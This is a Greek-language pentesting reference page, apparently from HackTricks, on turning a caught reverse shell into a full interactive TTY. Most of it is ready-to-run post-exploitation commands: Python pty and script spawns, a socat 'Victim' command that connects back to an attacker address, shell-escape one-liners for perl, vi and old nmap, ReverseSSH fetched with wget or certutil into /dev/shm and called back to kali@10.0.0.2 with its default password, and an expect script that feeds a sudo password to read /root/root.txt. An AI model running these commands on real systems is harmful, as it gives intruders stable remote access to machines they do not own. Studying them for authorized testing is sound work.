# Πλήρη TTY

{{#include ../../banners/hacktricks-training.md}}

## Πλήρες TTY

Το `/etc/shells` περιέχει τα έγκυρα pathnames των login shells και χρησιμοποιείται από ορισμένα προγράμματα· δεν αποτελεί καθολική προϋπόθεση για την εκχώρηση ενός PTY.<sup>[[3]](#references)[[4]](#references)</sup> Αν ένα πρόγραμμα όπως το `pkexec` απορρίπτει το `SHELL` με το μήνυμα `The value for the SHELL variable was not found in the /etc/shells file`, βεβαιωθείτε ότι το ακριβές path του shell (για παράδειγμα, `/bin/bash`) υπάρχει στο `/etc/shells`.<sup>[[10]](#references)</sup> Η παρακάτω ακολουθία ανάκτησης `CTRL+Z`/`fg` χρησιμοποιεί Bash job control· αν το τρέχον shell δεν είναι Bash, ξεκινήστε το Bash πριν χρησιμοποιήσετε αυτή την ακολουθία.<sup>[[7]](#references)</sup>

#### Python

Το `pty.spawn` της Python ξεκινά ένα πρόγραμμα συνδεδεμένο με τα standard input, output και error streams της τρέχουσας διεργασίας, παρέχοντας στο Bash ένα pseudo-terminal σε αυτή τη συνεδρία.<sup>[[4]](#references)</sup>
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
> [!TIP]
> Μπορείτε να βρείτε τον **αριθμό** των **γραμμών** και των **στηλών** εκτελώντας το **`stty -a`**· το `-a` εμφανίζει όλες τις τρέχουσες ρυθμίσεις του terminal. Η έξοδος της εντολής εξαρτάται από το terminal, επομένως χρησιμοποιήστε τις τιμές που αναφέρει η τρέχουσα session.<sup>[[11]](#references)</sup>

#### script

Το utility `script` καταγράφει μια session του terminal· εδώ το `/dev/null` απορρίπτει το typescript, το `-q` καταστέλλει τα μηνύματα έναρξης και ολοκλήρωσης και το `-c` εκτελεί το Bash αντί για το default shell.<sup>[[5]](#references)</sup>
```bash
script /dev/null -qc /bin/bash #/dev/null is to not store anything
```
Μετά από οποιαδήποτε μέθοδο PTY-spawn, αναστείλετε τη συνεδρία Netcat και επαναφέρετέ την με local raw mode και, στη συνέχεια, ορίστε το remote terminal environment και τις διαστάσεις του:
```bash
(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
#### socat

Ο listener χρησιμοποιεί το τρέχον τερματικό σε raw mode με απενεργοποιημένο local echo και αποδέχεται TCP connections στη θύρα 4444. Η εντολή του victim εκχωρεί ένα pty, συνδέει το stderr, δημιουργεί ένα session, προωθεί το SIGINT και εφαρμόζει sane terminal settings· προσθέστε `ctty` αν το child χρειάζεται controlling terminal.<sup>[[6]](#references)</sup>
```bash
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```
### **Εκκίνηση shells**

- `python -c 'import pty; pty.spawn("/bin/sh")'`
- `echo os.system('/bin/bash')`
- `/bin/sh -i`
- `script -qc /bin/bash /dev/null`
- `perl -e 'exec "/bin/sh";'`
- perl: `exec "/bin/sh";`
- ruby: `exec "/bin/sh"`
- lua: `os.execute('/bin/sh')`
- IRB: `exec "/bin/sh"`
- vi: `:!bash`
- vi: `:set shell=/bin/bash:shell`
- nmap (παλιές εκδόσεις με `--interactive`): `!sh`

Το Nmap escape εξαρτάται από την έκδοση: το Nmap αφαίρεσε τη λειτουργία `--interactive` σε νεότερες εκδόσεις, επομένως το `!sh` ισχύει μόνο για παλιές εκδόσεις.<sup>[[13]](#references)</sup>

## ReverseSSH

Ένας βολικός τρόπος για **interactive shell access**, καθώς και για **file transfers** και **port forwarding**, είναι να τοποθετήσετε στον στόχο τον statically-linked ssh server [ReverseSSH](https://github.com/Fahrj/reverse-ssh).<sup>[[1]](#references)</sup>

Παρακάτω υπάρχει ένα παράδειγμα για `x86` με το δημοσιευμένο UPX-compressed binary του project. Για άλλες αρχιτεκτονικές ή release artifacts, χρησιμοποιήστε τη [σελίδα releases](https://github.com/Fahrj/reverse-ssh/releases/latest/) ως οδηγό.<sup>[[1]](#references)</sup>

1. Προετοιμάστε το local host ώστε να δεχτεί την εισερχόμενη σύνδεση SSH. Σε listener mode, το `-l` ενεργοποιεί τον listener και το `-p 4444` επιλέγει τη θύρα στην οποία δέχεται τη σύνδεση του στόχου.<sup>[[1]](#references)</sup>
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -v -l -p 4444
```
- (2a) Στόχος Linux. Μεταφέρετε το ίδιο artifact `upx_reverse-sshx86` στο `/dev/shm/reverse-ssh` και κάντε το εκτελέσιμο. Το `-p 4444` του στόχου επιλέγει τη θύρα του listener παραπάνω, ενώ το `kali@10.0.0.2` παρέχει τον λογαριασμό και το host που χρησιμοποιούνται για τη σύνδεση προς τα πίσω.<sup>[[1]](#references)</sup>
```bash
/dev/shm/reverse-ssh -p 4444 kali@10.0.0.2
```
- (2b) Windows target. Το Full interactive PowerShell απαιτεί Windows 10 build 17763· δείτε το [project README](https://github.com/Fahrj/reverse-ssh#features).<sup>[[1]](#references)</sup>
```bash
# Drop it via your preferred way, e.g.
certutil.exe -f -urlcache https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86.exe reverse-ssh.exe

reverse-ssh.exe -p 4444 kali@10.0.0.2
```
Το παράδειγμα για Windows χρησιμοποιεί το `certutil` με τις επιλογές `-f -urlcache`· η Microsoft τεκμηριώνει ότι το `-f` επιβάλλει τη λήψη από URL και σημειώνει ότι οι διαθέσιμες παράμετροι διαφέρουν ανάλογα με την έκδοση, επομένως ελέγξτε το `certutil -?` αν αυτή η μορφή δεν είναι διαθέσιμη.<sup>[[12]](#references)</sup>

- Αφού επιτευχθεί η reverse σύνδεση, ο listener του ReverseSSH σε reverse-mode δεσμεύει από προεπιλογή τη θύρα `8888` (ή την τιμή που παρέχεται με το `-b`) και οι εισερχόμενες συνδέσεις δέχονται οποιοδήποτε username με τον προεπιλεγμένο κωδικό πρόσβασης `letmeinbrudipls`. Το remote shell εκτελείται με τα δικαιώματα του λογαριασμού που εκκίνησε το `reverse-ssh(.exe)`.<sup>[[1]](#references)</sup>
```bash
# Interactive shell access
ssh -p 8888 127.0.0.1

# Bidirectional file transfer
sftp -P 8888 127.0.0.1
```
## Penelope

Το [Penelope](https://github.com/brightio/penelope) αναβαθμίζει αυτόματα τα Unix-like reverse shells σε PTY, αλλάζει το μέγεθος των Unix-like terminals και καταγράφει τις αλληλεπιδράσεις με το shell· για Windows shells παρέχει readline, αλλά όχι αλλαγή μεγέθους terminal σε πραγματικό χρόνο.<sup>[[2]](#references)</sup>

Εκτελέστε το `penelope` για ακρόαση στο `0.0.0.0:4444` από προεπιλογή· τα εισερχόμενα Unix-like shells μπορούν στη συνέχεια να αναβαθμιστούν και να καταγραφούν αυτόματα.<sup>[[2]](#references)</sup>

## No TTY

Αν για κάποιον λόγο δεν μπορείτε να αποκτήσετε πλήρες TTY, **εξακολουθείτε να μπορείτε να αλληλεπιδράσετε με προγράμματα** που αναμένουν είσοδο χρήστη. Στο ακόλουθο παράδειγμα, το Expect εκκινεί το `sudo`, περιμένει το prompt κωδικού πρόσβασης, στέλνει τον κωδικό πρόσβασης και επιστρέφει τον έλεγχο με το `interact`· το `sudo -S` διαβάζει τον κωδικό πρόσβασής του από την standard input. Χρησιμοποιήστε το μόνο σε εξουσιοδοτημένο lab και αποφύγετε την τοποθέτηση πραγματικών διαπιστευτηρίων στο shell history ή σε source files.<sup>[[8]](#references)[[9]](#references)</sup>
```bash
expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
```
## References

- [1] [ReverseSSH - Στατικά συνδεδεμένος ssh server με λειτουργικότητα reverse shell για CTFs και παρόμοιες περιπτώσεις](https://github.com/Fahrj/reverse-ssh)
- [2] [Penelope - Shell handler που αυτοματοποιεί ορισμένες ενέργειες για να διευκολύνει τη ζωή](https://github.com/brightio/penelope)
- [3] [shells(5) — Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man5/shells.5.html)
- [4] [Python `pty` — Τεκμηρίωση Python](https://docs.python.org/3/library/pty.html)
- [5] [script(1) — Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man1/script.1.html)
- [6] [socat(1) — Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man1/socat.1.html)
- [7] [Εγχειρίδιο αναφοράς Bash — Έλεγχος εργασιών](https://www.gnu.org/s/bash/manual/bash.html)
- [8] [sudo(8) — Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [9] [expect(1) — Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man1/expect.1.html)
- [10] [pkexec.c](https://github.com/polkit-org/polkit/blob/main/src/programs/pkexec.c)
- [11] [stty(1) — Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man1/stty.1.html)
- [12] [certutil](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil)
- [13] [Αρχείο αλλαγών Nmap](https://nmap.org/changelog.html)
{{#include ../../banners/hacktricks-training.md}}
